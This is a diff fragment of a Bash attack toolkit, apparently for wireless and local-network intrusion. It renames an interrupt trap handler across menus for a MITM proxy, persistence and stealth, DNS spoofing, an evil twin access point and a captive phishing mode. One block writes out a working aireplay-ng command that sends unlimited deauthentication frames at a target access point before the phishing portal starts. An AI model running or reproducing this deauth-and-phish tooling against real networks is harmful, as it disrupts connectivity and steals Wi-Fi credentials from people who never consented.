 # ===============================================================
 menu_wireless_ext() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "W I R E L E S S   E X T E N D E D"
@@ -10442,7 +10508,7 @@ menu_wireless_ext() {
 # LOCAL NETWORK MENU — MITM proxy added
 # ===============================================================
 menu_lan() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     if ! lan_pick_iface; then return; fi
     while true; do
         print_banner
@@ -10660,7 +10726,7 @@ _mitm_stop() {
 # MITM menu — with [L] live xterm
 # ===============================================================
 _mitm_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "F U L L   M I T M   P R O X Y"
@@ -11081,14 +11147,14 @@ _mitm_live_inplace() {
             esac
         done
     kill $hb 2>/dev/null
-    trap on_interrupt INT
+    trap phobia_interrupt INT
 }
 
 # ===============================================================
 # STEALTH MENU — redefined so [s] works from WiFi main
 # ===============================================================
 addon_stealth_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "P E R S I S T E N C E   &   S T E A L T H"
@@ -11122,7 +11188,7 @@ addon_stealth_menu() {
 # MAIN MENU — [s] opens stealth, [7] opens DNS spoof
 # ===============================================================
 main_menu() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     while true; do
         print_banner
         menu_header "M A I N   M E N U"
@@ -11635,7 +11701,7 @@ PYEOF
             bash -c "ip link set $MONITOR_ACTUAL down 2>/dev/null; iw dev $MONITOR_ACTUAL set type monitor 2>/dev/null; iw dev $MONITOR_ACTUAL set channel $TARGET_CHANNEL 2>/dev/null; ip link set $MONITOR_ACTUAL up 2>/dev/null; sleep 1; aireplay-ng --ignore-negative-one --deauth 0 -a $TARGET_BSSID $MONITOR_ACTUAL; echo; echo '>>> stopped'; read"
     fi
 
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     echo ""
     echo -e "${BOLD}${GREEN}===================================================${NC}"
     echo -e "${BOLD}${GREEN} BITS PHISH RUNNING -- SSID: $TARGET_ESSID${NC}"
@@ -11659,7 +11725,7 @@ PYEOF
 # EVIL TWIN MENU — with 3rd option for BITS
 # ===============================================================
 menu_evil_twin() {
-    trap on_interrupt INT
+    trap phobia_interrupt INT
     prepare_evil_twin_vifs
     while true; do
         print_banner
